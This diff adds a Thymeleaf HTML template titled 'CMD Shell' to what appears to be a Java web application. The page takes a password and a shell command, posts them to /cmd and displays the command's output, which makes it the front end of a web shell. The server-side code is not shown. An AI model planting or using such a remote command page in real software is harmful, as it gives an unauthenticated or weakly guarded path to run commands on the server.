@@ -1,0 +1,49 @@
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.thymeleaf.org" xmlns:layout="http://www.ultraq.net.nz/thymeleaf/layout" layout:decorator="default">
+<head>
+    <title>CMD Shell</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <link rel="stylesheet" type="text/css"
+          th:href="@{css/bootstrap.min.css}" />
+</head>
+<body>
+
+
+<div class="container">
+
+    <div class="starter-template" layout:fragment="content">
+
+        <table class="table table-striped">
+
+            <tbody>
+            <tr>
+                <td>
+                    <form action="#" th:action="@{/cmd}" method="post" enctype="multipart/form-data">
+                        <p>pass:<input type="text" name="pwd" th:value="${pwd}"/></p>
+                        <p>cmd:&nbsp;<input type="text" name="cmd" th:value="${command}"/></p>
+                        <p><input type="submit" value="Submit" /></p>
+                    </form>
+                </td>
+            </tr>
+            </tbody>
+        </table>
+
+        <p><b>Output:</b></p>
+        <pre th:utext="${#strings.escapeXml(output)}"></pre>
+
+    </div>
+    <!-- starter-template -->
+
+    <div th:if="${error != null}" class="alert alert-danger">
+        <strong>Error: </strong> <span th:text="${error}" th:remove="tag"></span>
+    </div>
+
+</div>
+<!-- /.container -->
+
+<script type="text/javascript"
+        th:src="@{js/bootstrap.js}"></script>
+</body>
+</html>
+
